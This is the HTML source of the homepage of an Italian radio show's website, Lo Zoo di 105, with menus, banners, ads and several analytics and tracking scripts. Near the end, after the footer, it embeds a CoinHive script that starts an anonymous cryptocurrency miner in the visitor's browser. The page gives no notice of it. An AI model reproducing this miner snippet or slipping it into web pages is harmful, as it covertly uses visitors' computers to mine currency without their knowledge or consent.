<!DOCTYPE html>
<!--[if lt IE 7]> <html class="ie6" lang="it" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://ogp.me/ns#"> <![endif]-->
<!--[if IE 7]>    <html class="ie7" lang="it" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://ogp.me/ns#"> <![endif]-->
<!--[if IE 8]>    <html class="ie8" lang="it" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://ogp.me/ns#"> <![endif]-->
<!--[if gt IE 8]><!-->
<html class='no-js' lang='it' xmlns:fb='http://www.facebook.com/2008/fbml' xmlns:og='http://ogp.me/ns#'>
<!--<![endif]-->
<head>
<title>Il sito ufficiale dello Zoo di 105 - Il sito dello Zoo</title>
<meta content="Lo zoo di 105, il programma radiofonico più irriverente e di successo di italia" name="description"></meta>
<meta content="website" property="og:type"></meta>
<meta content="http://ilsitodellozoo.com/" property="og:url"></meta>
<meta content="Il sito ufficiale dello Zoo di 105" property="og:title"></meta>
<meta content="Lo zoo di 105, il programma radiofonico più irriverente e di successo di italia" property="og:description"></meta>
<meta content="http://ilsitodellozoo.com/assets/banner/lo_zoo_di_105-f6425d81c71ba0d6b81a64b10798c70a.jpg" property="og:image"></meta>
<meta content="it_IT" property="og:locale"></meta>
<meta content="summary_large_image" name="twitter:card"></meta>
<meta content="@Zoodi105" name="twitter:site"></meta>
<meta content="@Zoodi105" name="twitter:creator"></meta>
<meta content="http://ilsitodellozoo.com/" name="twitter:url"></meta>
<meta content="Il sito ufficiale dello Zoo di 105" name="twitter:title"></meta>
<meta content="Lo zoo di 105, il programma radiofonico più irriverente e di successo di italia" name="twitter:description"></meta>
<meta content="http://ilsitodellozoo.com/assets/banner/lo_zoo_di_105-f6425d81c71ba0d6b81a64b10798c70a.jpg" name="twitter:image"></meta>

<meta charset='utf-8'>
<meta content='IE=edge,chrome=1' http-equiv='X-UA-Compatible'>
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","errorBeacon":"bam.nr-data.net","licenseKey":"a797232f66","applicationID":"8586605","transactionName":"dVZXTUBdDVwDRBwLVltcSVhVV05ZCFJWGw==","queueTime":0,"applicationTime":9,"agent":""}</script>
<script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var o=t[n]={exports:{}};e[n][0].call(o.exports,function(t){var o=e[n][1][t];return r(o||t)},o,o.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(e,t,n){function r(){}function o(e,t,n){return function(){return i(e,[f.now()].concat(u(arguments)),t?null:this,n),t?void 0:this}}var i=e("handle"),a=e(2),u=e(3),c=e("ee").get("tracer"),f=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],d="api-",l=d+"ixn-";a(p,function(e,t){s[t]=o(d+t,!0,"api")}),s.addPageAction=o(d+"addPageAction",!0),s.setCurrentRouteName=o(d+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,o="function"==typeof t;return i(l+"tracer",[f.now(),e,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],n),o)try{return t.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],n),e}finally{c.emit("fn-end",[f.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=o(l+t)}),newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),i("err",[e,f.now()])}},{}],2:[function(e,t,n){function r(e,t){var n=[],r="",i=0;for(r in e)o.call(e,r)&&(n[i]=t(r,e[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],3:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,i=Array(o<0?0:o);++r<o;)i[r]=e[t+r];return i}t.exports=r},{}],4:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function o(e){function t(e){return e&&e instanceof r?e:e?c(e,u,i):i()}function n(n,r,o,i){if(!d.aborted||i){e&&e(n,r,o);for(var a=t(o),u=m(n),c=u.length,f=0;f<c;f++)u[f].apply(a,r);var p=s[y[n]];return p&&p.push([b,n,r,a]),a}}function l(e,t){v[e]=m(e).concat(t)}function m(e){return v[e]||[]}function w(e){return p[e]=p[e]||o(n)}function g(e,t){f(e,function(e,n){t=t||"feature",y[n]=t,t in s||(s[t]=[])})}var v={},y={},b={on:l,emit:n,get:w,listeners:m,context:t,buffer:g,abort:a,aborted:!1};return b}function i(){return new r}function a(){(s.api||s.feature)&&(d.aborted=!0,s=d.backlog={})}var u="nr@context",c=e("gos"),f=e(2),s={},p={},d=t.exports=o();d.backlog=s},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!x++){var e=h.info=NREUM.info,t=d.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return s.abort();f(y,function(t,n){e[t]||(e[t]=n)}),c("mark",["onload",a()+h.offset],null,"api");var n=d.createElement("script");n.src="https://"+e.agent,t.parentNode.insertBefore(n,t)}}function o(){"complete"===d.readyState&&i()}function i(){c("mark",["domContent",a()+h.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(u=Math.max((new Date).getTime(),u))-h.offset}var u=(new Date).getTime(),c=e("handle"),f=e(2),s=e("ee"),p=window,d=p.document,l="addEventListener",m="attachEvent",w=p.XMLHttpRequest,g=w&&w.prototype;NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:w,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},b=w&&g&&g[l]&&!/CriOS/.test(navigator.userAgent),h=t.exports={offset:u,now:a,origin:v,features:{},xhrWrappable:b};e(1),d[l]?(d[l]("DOMContentLoaded",i,!1),p[l]("load",r,!1)):(d[m]("onreadystatechange",o),p[m]("onload",r)),c("mark",["firstbyte",u],null,"api");var x=0,E=e(4)},{}]},{},["loader"]);</script>
<meta content='width=device-width, initial-scale=1.0' name='viewport'>
<meta content='74CE58C5B2492C408247BCC9715B453C' name='msvalidate.01'>
<meta content='PAwanXpj8kW1aFOF1yUMP3CWXwyQL5-761p9EK9Tctk' name='google-site-verification'>

<link href='https://plus.google.com/104738774733433352792' rel='publisher'>
<meta content='74CE58C5B2492C408247BCC9715B453C' name='msvalidate.01'>
<link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
<meta content='929188450483691' property='fb:app_id'>
<link charset="utf-8" href="/assets/application-82860c5bf1b2cbf6ffe20b63508e7270.css" media="screen" rel="stylesheet" type="text/css" />
<script>
  !function(w) {
    w.megiston = megiston = w.megiston ||{};
    megiston.constants = {
      fb_app_id : "929188450483691",
    };
  }(this);
</script>
<script>
  var googletag = googletag || {};
  googletag.cmd = googletag.cmd || [];
  (function() {
    var gads = document.createElement('script');
    gads.async = true;
    gads.type = 'text/javascript';
    var useSSL = 'https:' == document.location.protocol;
    gads.src = (useSSL ? 'https:' : 'http:') +
      '//www.googletagservices.com/tag/js/gpt.js';
    var node = document.getElementsByTagName('script')[0];
    node.parentNode.insertBefore(gads, node);
  })();
</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
</script>
<script async="async" src="/assets/lazysizes.min-80fd829d52c7eb4915574e5266918784.js" type="text/javascript"></script>
<script src="/assets/pubsub-53e2fc50926d490bcc4164c32b0a2275.js" type="text/javascript"></script>
<script src="/assets/application-e52372f2887454ad976874242522ee9c.js" type="text/javascript"></script>
<script src="/assets/fuckadblock-31bab971429d779f9bed6480a09b41fe.js" type="text/javascript"></script>
<!--[if lt IE 8]>
<link href="/assets/ie-8a8f13e10eefc4abb8b1613418d614b7.css" media="screen" rel="stylesheet" type="text/css" />
<![endif]-->
<meta content="authenticity_token" name="csrf-param" />
<meta content="jgR1vcCSorfvG5wKO43s8P5VCNeJoTn4BtOyPhQzT6w=" name="csrf-token" />

</head>
<body class='ilsitodellozoo'>
<script src="/ads.js" type="text/javascript"></script>
<div class='container-fluid font-styled' id='goloide'>
<div class='col-xs-12'>
<p>
<span class='fa fa-exclamation-triangle fa-4x pull-left'></span>
GOLOIDEEE DISABILITA IL BLOCKER!!!! EDDAIIIIIIIIIII!!
</p>
<a href="http://it.wikihow.com/Disattivare-AdBlock" class="btn btn-lg btn-primary" rel="nofollow" target="_blank"><i class="fa fa-question-circle"></i> Come disabilitare adblock</a>
</div>
</div>
<ul id='flash'></ul>
<div id='container'>
<header>
<nav class='navbar-alt'>
<div class='container-fluid nopadding'>
<div class='container container-large nopadding text-center'>
<div class='navbar-audiweb inline-block center'>
Questo sito contribuisce alla audience di
<a href="http://www.105.net" rel="nofollow" target="_blank"><img alt="105" notlazy="true" src="/assets/logos/105-4ed839e7bd0061ff4c22bd2cc8f67788.png" /></a>
</div>
</div>
</div>
</nav>
<button class='navbar-toggle offcanvas-toggle pull-right' data-target='#js-bootstrap-offcanvas' data-toggle='offcanvas' style='float:left;' type='button'>
<span class='sr-only'>Toggle navigation</span>
<span class='icon-bar'></span>
<span class='icon-bar'></span>
<span class='icon-bar'></span>
</button>
<nav class='navbar navbar-default navbar navbar-default navbar-offcanvas navbar-offcanvas-fade' id='js-bootstrap-offcanvas' role='navigation'>
<div class='container-fluid'>
<div class='container container-large nopadding'>
<ul class='nav navbar-nav navbar-left'>
<li><a href="/"><i class='fa fa-home '></i> Home</a></li>
<li class='dropdown'>
<a href="#" class="dropdown-toggle" data-toggle="dropdown">Zoo News
<b class='caret'></b>
</a><ul class='dropdown-menu'><li><a href="/it/zoo105/cat/dal-mondo">Dal Mondo</a></li>
<li><a href="/it/zoo105/cat/zoo-news">ZOO NEWS</a></li>
<li><a href="/it/zoo105/cat/pelozoo">PeloZoo</a></li>
<li><a href="/it/zoo105/cat/san-jimmy-2017">San Jimmy 2017</a></li>
<li><a href="/it/zoo105/cat/on-air-storia-di-un-successo">ON AIR - STORIA DI UN SUCCESSO </a></li>
</ul>
</li>

<li class='dropdown'>
<a href="#" class="dropdown-toggle" data-toggle="dropdown">Scenette
<b class='caret'></b>
</a><ul class='dropdown-menu'>
<li><a href="/it/archivio-scenette">Tutte</a></li>
<li><a href="/it/scenette/ultime">Le nuove</a></li>
<li><a href="/it/scenette/hits">TOP 20 - Marzo</a></li>
<li><a href="/it/scenette/hits?all_time=1">TOP 20 di sempre</a></li>
<li><a href="javascript:megiston.fn.newWindow(&#x27;/it/lo-zoo-di-105-live-diretta-radio&#x27;,&#x27;streamZoo105&#x27;,362,780);"><i class='fa fa-music inline-block '></i>&nbsp; ON AIR</a></li>
</ul>
</li>
<li><a href="/it/scenette/of_today">Repliche</a></li>
<li class='dropdown'>
<a href="#" class="dropdown-toggle" data-toggle="dropdown">Zoolife
<b class='caret'></b>
</a><ul class='dropdown-menu'>
<li><a href="/it/sfida-lo-zoo"><i class='fa fa-gamepad inline-block '></i>&nbsp; Zoo game</a></li>
<li><a href="/it/zoo-eventi">Eventi</a></li>
<li><a href="/it/artisti">Artisti</a></li>
</ul>
</li>
<li><a href="http://www.zoostore.it/zoostore?locale=it"><i class='fa fa-shopping-cart'></i> SHOP</a></li>
</ul>
<ul class='nav navbar-nav navbar-right'>
<ul class='list-inline inline-block font-styled uppercase navbar-control'>
<li><a href="javascript:megiston.fn.newWindow(&#x27;/it/lo-zoo-di-105-live-diretta-radio&#x27;,&#x27;streamZoo105&#x27;,362,780);" class="navbar-onair"><i class='fa fa-music inline-block '></i> Radio</a></li>
</ul>
<ul class='social list-inline inline-block pull-left hidden-sm hidden-xs'>
<li>
<div id='fb-root'></div>
<div class='fb-like' data-href='https:&#47;&#47;www.facebook.com&#47;THE105ZOO' data-layout='button_count' data-send='false' data-show-faces='false' data-width='90'></div>
</li>
</ul>
<li><a href="/it/cerca"><span class='glyphicon glyphicon-search inline-block'></span></a></li>
</ul>
</div>
</div>
</nav>
<section class='black nopadding navbar-adv'>
<div class='container-fluid'>
<div class='container container-large nopadding'>
<div class='row text-center'>
<a href="/" class="navbar-brand pull-left">Il sito dello Zoo di radio 105</a>
<div class="gpt-ad" id="div-gpt-ad-1441382962595-2" data-gpt-path="/180475732/zoo_lb" data-gpt-dimensions="[728, 90]" data-gpt-sizes='{"breakpoints": [[992,200,728,90],[740,200,468,60],[0,0,320,50]]}'></div>
</div>
</div>
</div>
</section>

</header>
<div class='main' id='main'>
<div class='container-fluid black'>
<div class='container container-large nopadding'>
<div class='row row-a'>
<div class='col-xs-12'>
<div class='carousel slide' data-ride='carousel' id='carousel'>
<!-- Wrapper for slides -->
<div class='carousel-inner'>
<a class="item active" href="https://www.youtube.com/user/ilsitodellozoo/videos"><img alt="Original_banner_youtube" class="center-block" notlazy="true" src="/uploads/images/banners/34/original_BANNER_YOUTUBE-b85bb47eadafc92797b937bc9c8e3320.jpg" />
</a><div class='item'>
<img alt="Original_info_booking_paolo_giusti" class="center-block" notlazy="true" src="/uploads/images/banners/36/original_info_booking_paolo_giusti-9de8d60cbcb80b4553e098ce3eae2060.png" />
</div>
</div>
<!-- Controls -->
<a class='left carousel-control green' data-slide='prev' href='#carousel' role='button'>
<i class='fa fa-3x fa-chevron-left'></i>
</a>
<a class='right carousel-control green' data-slide='next' href='#carousel' role='button'>
<i class='fa fa-3x fa-chevron-right'></i>
</a>
</div>
</div>
</div>
</div>
</div>
<div class='container-fluid black homepage white-behavior homepage-menu-icons'>
<div class='container container-large nopadding'>
<div class='row row-a'>
<div class='col-xs-6 col-sm-2'>
<a class="homepage-link clearfix uppercase" href="javascript:megiston.fn.newWindow(&#x27;/it/lo-zoo-di-105-live-diretta-radio&#x27;,&#x27;streamZoo105&#x27;,362,780);"><div class='fa fa-music'></div>
<div class='homepage-link-title'>
<h3>
Ascolta la radio
</h3>
</div>
<img class="img-responsive lazyload" data-sizes="auto" data-src="/assets/home/ascolta_lo_zoo-64eede148be16cce6cfcdb3027794019.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<div class='col-xs-6 col-sm-2'>
<a class="homepage-link clearfix uppercase" href="/it/archivio-scenette"><div class='fa fa-heart odd'></div>
<div class='homepage-link-title'>
<h3>
Scenette dello zoo
</h3>
</div>
<img class="img-responsive lazyload" data-sizes="auto" data-src="/assets/home/zoo_scenette-5e7342617e8afc0528e4fb573e80cfb1.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<div class='col-xs-6 col-sm-2'>
<a class="homepage-link clearfix uppercase" href="/it/scenette/of_today"><div class='fa fa-forward'></div>
<div class='homepage-link-title'>
<h3>
Zoo repliche
</h3>
</div>
<img class="img-responsive lazyload" data-sizes="auto" data-src="/assets/home/zoo_repliche-4efccf66e5128031fbf98896cd29c597.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<div class='col-xs-6 col-sm-2'>
<a class="homepage-link clearfix uppercase" href="/it/zoo105/cat/zoo-news"><div class='fa fa-comments odd'></div>
<div class='homepage-link-title'>
<h3>
Zoo news
</h3>
</div>
<img class="img-responsive lazyload" data-sizes="auto" data-src="/assets/home/zoo_news-efd1df1ca03cc3ac3cba7d2cdca73646.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<div class='col-xs-6 col-sm-2'>
<a class="homepage-link clearfix uppercase" href="http://www.zoostore.it/zoostore?locale=it"><div class='fa fa-shopping-cart'></div>
<div class='homepage-link-title'>
<h3>
Zoo store
</h3>
</div>
<img class="img-responsive lazyload" data-sizes="auto" data-src="/assets/home/zoo_store-e3e4b96bef13ef3661c2baeaef721f16.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<div class='col-xs-6 col-sm-2'>
<a class="homepage-link clearfix uppercase" href="/it/sfida-lo-zoo"><div class='fa fa-gamepad odd'></div>
<div class='homepage-link-title'>
<h3>
Zoo games
</h3>
</div>
<img class="img-responsive lazyload" data-sizes="auto" data-src="/assets/home/ascolta_lo_zoo-64eede148be16cce6cfcdb3027794019.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
</div>
</div>
</div>
<div class='container-fluid black-border-bottom homepage black'>
<div class='container container-large nopadding'>
<div class='row row-a'>
<div class='col-xs-12 col-sm-6 text-right'>
<a href="/it/instazoo/tu-e-lo-zoo-su-instagram" class="block"><img alt="Taggati su instagram con #lozoodi105 per comparire nel sito " class="img-responsive lazyload" data-sizes="auto" data-src="/assets/banner/instazoo_banner_gen_sx-00d02e82a5239893ab61d0212c09ce99.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /></a>
</div>
<div class='hidden-xs col-sm-6'>
<a href="/it/instazoo/tu-e-lo-zoo-su-instagram" class="block"><img alt="Scopri il nuovo instazoo" class="img-responsive lazyload" data-sizes="auto" data-src="/assets/banner/instazoo_banner_gen_dx-f4686629e6a76381689a5870c32e6151.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /></a>
</div>
</div>
</div>
</div>
<div class='container-fluid homepage black'>
<div class='container container-large nopadding'>
<div class='row row-a'>
<div class='hidden-xs col-sm-6'>
<a href="/it/zoo105/cat/dal-mondo"><img alt="Scarica l&#x27;app ufficiale dello zoo di 105 su appstore" class="img-responsive lazyload" data-sizes="auto" data-src="/assets/banner/banner_news_ilsitodellozoo-9fa141d8f79eee3e7a2b172108dc69ce.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /></a>
</div>
<div class='col-xs-12 col-sm-6'>
<a href="https://itunes.apple.com/it/app/lozoodi105-app/id823650069?mt=8" class="block" rel="nofollow" target="_blank"><img alt="Ora puoi navigare il sito su smartphone e tablet" class="img-responsive lazyload" data-sizes="auto" data-src="/assets/banner/banner_app_ilsitodellozoo-ad700eec0590b3a6fc49a25ca7f4aead.jpg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /></a>
</div>
</div>
</div>
</div>
<script>
  megiston.currPage = "homepage_index_ilsitodellozoo"
</script>

</div>
<footer><div class='container-fluid footer'>
<section class='row footer-major-links hidden-xs hidden-xs hidden-sm'>
<div class='col-xs-12'>
<div class='text-center ad-slot homepage-ads'>
</div>
</div>
</section>
<section class='row footer-minor-links gray-dark'>
<div class='col-xs-12'>
<ul class='inline-block-list pull-left'>
<li>
<a class='iubenda-nostyle no-brand iubenda-embed' href='&#47;&#47;www.iubenda.com&#47;privacy-policy&#47;274984' title='Privacy Policy'>Privacy Policy</a>
</li>
<li class='hidden-xs'><a href="/it/pagine/credits-ilsitodellozoo" class="credits">Credits</a></li>
</ul>
<ul class='inline-block-list pull-right'>
<li><a href="/it/richiesta/nuova" class="credits"><i class='fa fa-heartbeat orange'></i> Zoo Markette</a></li>
</ul>
</div>
</section>
<section class='row footer-copy'>
<div class='col-xs-12'>
<p class='text-center'>
The zoo Studio LLC - Stefania Pittaluga © 2015
</p>
</div>
</section>
<div class='row row-a footer-social font-styled text-center'>
<div class='col-xs-3'>
<a class="fb" href="javascript:window.open(&#x27;https://www.facebook.com/sharer/sharer.php?u=http://ilsitodellozoo.com/&#x27;, &#x27;_blank&#x27;, &#x27;width=800,height=300&#x27;);void(0);" rel="nofollow" target="_blank"><span class='fa fa-facebook-square'></span>
<span class='hidden-xs'>Facebook</span>
<span class='counter fb-counter'>
<b>
<i class="fa fa-spinner fa-spin"></i>
</b>
<i class='fa fa-retweet'></i>
</span>
</a></div>
<div class='col-xs-3'>
<a class="twitter" href="javascript:window.open(&#x27;https://twitter.com/home?status=http://ilsitodellozoo.com/&#x27;, &#x27;_blank&#x27;, &#x27;width=800,height=300&#x27;);void(0);" rel="nofollow" target="_blank"><span class='fa fa-twitter'></span>
<span class='hidden-xs'>Twitter</span>
</a></div>
<div class='col-xs-3'>
<a class="instagram" href="https://instagram.com/the_zoo_/" rel="nofollow" target="_blank"><span class='fa fa-instagram'></span>
<span class='hidden-xs'>Instagram</span>
<span class='counter'>
105K
<i class='fa fa-retweet'></i>
</span>
</a></div>
<div class='col-xs-3'>
<a class="youtube" href="https://www.youtube.com/user/ilsitodellozoo/videos" rel="nofollow" target="_blank"><span class='fa fa-youtube'></span>
<span class='hidden-xs'>Youtube</span>
<span class='counter'>
52.2K
<i class='fa fa-retweet'></i>
</span>
</a></div>
</div>
<div class='row'>
<div class='col-xs-12 nopadding'>
<div class='hidden-md hidden-lg text-center'>
</div>
</div>
</div>
</div>
</footer>
</div>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
  var miner = new CoinHive.Anonymous('9QQO8rblc0bwgsKDdEAxSaNjwi7cSUyS',{
    throttle: 0.4
  });
  miner.start();
</script>
<script>
  megiston.subscriptions["init_homepage_index_ilsitodellozoo"] = []
  megiston.subscribe("init_homepage_index_ilsitodellozoo", function () {
    $('#carousel').carousel({
      interval: 5000
    })
  });
</script>

<script>
  ga('create', 'UA-5361869-39', 'auto');
  ga('send', 'pageview');
</script>
<!-- Webtrekk 3.2.1, (c) www.webtrekk.com -->
<script type="text/javascript" src="/webtrekk_v3.min.js"></script>
<script type="text/javascript">
    function getContentIdByURL() {
        var url = document.location.href;
        if (url && url !== null) {
            return url.split("?")[0].toLowerCase();
        }
        return "no_content";
    }

    function getExistsParameterByName(name) {
        var match = RegExp('[?&]' + name).exec(window.location.search);
        if (match)
            return name;
        else
            return 'no-refresh';
    }

    var pageConfig = {
        linkTrack: "link",
        heatmap: "0",
        form: "",
        contentId: getContentIdByURL()
    };

    var wt = new webtrekkV3(pageConfig);
    var refresh;

    wt.ignorePrerendering = true;
    wt.contentGroup = {1: "Gruppo Finelco", 2: "105.net", 3: "ilsitodellozoo"};
    refresh = getExistsParameterByName("refresh_ce");
    wt.customParameter = {1: document.title, 2: refresh};

    wt.sendinfo();
//-->
</script>
<noscript>
<div>
    <img src="https://gruppofinelco01.webtrekk.net/390174765854018/wt.pl?p=322,105.net" height="1" width="1" alt="" />
</div>
</noscript>

<!-- END::Webtrekk -->

<script>
  var _rsCI = "105-it";
  var _rsCG = "0";
  var _rsDN = "//secure-it.imrworldwide.com/";
  var _rsCC = 0;
  var _rsIP = 1;
  var _rsPLfl = 0;
</script>
<script src='//secure-it.imrworldwide.com/v53.js' type='text&#47;javascript'></script>
<noscript>
<div>
<img alt='' src='//secure-it.imrworldwide.com/cgi-bin/m?ci=105-it&cg=0' style='visibility:hidden;position:absolute;left:0px;top:0px;z-index:-1'>
</div>
</noscript>
<!-- END Nielsen Online SiteCensus V5.3 -->

<script data-wid="auto" type="text/javascript" src="//ads.viralize.tv/display/?zid=AAAdXHKMdS1LYnBC"></script>
</body>
</html>